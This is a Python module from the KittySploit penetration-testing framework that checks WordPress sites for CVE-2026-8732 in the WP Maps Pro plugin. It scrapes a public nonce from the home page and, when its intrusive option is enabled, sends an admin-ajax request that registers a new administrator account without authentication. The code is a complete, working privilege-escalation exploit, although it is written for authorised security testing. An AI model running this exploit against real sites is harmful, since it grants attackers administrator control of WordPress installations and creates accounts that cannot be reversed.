#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WP Maps Pro <= 6.1.0 unauthenticated admin creation (CVE-2026-8732)."""

from __future__ import annotations

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "wp-maps-pro"
_VULN_HIGH = (6, 1, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WP Maps Pro CVE-2026-8732 privilege escalation detect",
        "description": (
            "CVE-2026-8732: public wpgmp_local nonce allows unauthenticated "
            "wpgmp_temp_access_ajax administrator registration."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-8732",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-8732",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-8732.yaml",
        ],
        "modules": ["exploits/multi/http/wp_maps_pro_cve_2026_8732_admin_create"],
        "tags": ["web", "scanner", "wordpress", "wp-maps-pro", "priv-esc", "cve-2026-8732"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "account_creation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/wp_maps_pro_cve_2026_8732_admin_create",
                ],
            },
        },
    }

    active_register = OptBool(
        False,
        "Create throwaway administrator via admin-ajax (intrusive)",
        required=False,
    )

    _NONCE_RE = re.compile(
        r'["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
        re.I,
    )

    def _nonce(self) -> str:
        home = self.http_request(method="GET", path="/", allow_redirects=True)
        if not home or "wpgmp_local" not in (home.text or ""):
            return ""
        match = self._NONCE_RE.search(home.text or "")
        return match.group(1) if match else ""

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce = self._nonce()
        if not nonce:
            return False
        if not self.active_register:
            self.set_info(
                severity="high",
                cve="CVE-2026-8732",
                reason="WP Maps Pro frontend nonce exposed (wpgmp_temp_access surface)",
                version=version or "unknown",
            )
            return True
        user = f"ks{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        password = secrets.token_urlsafe(12)
        data = (
            f"action=wpgmp_temp_access_ajax&nonce={nonce}&check_temp=false"
            f"&user_login={user}&user_email={email}&user_pass={password}"
        )
        post = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=True,
        )
        if not post or int(post.status_code) != 200:
            return False
        body = post.text or ""
        if '"success":true' not in body.replace(" ", ""):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-8732",
            reason=f"Unauthenticated administrator created ({user})",
            detail=body[:300],
            version=version or "unknown",
        )
        return True
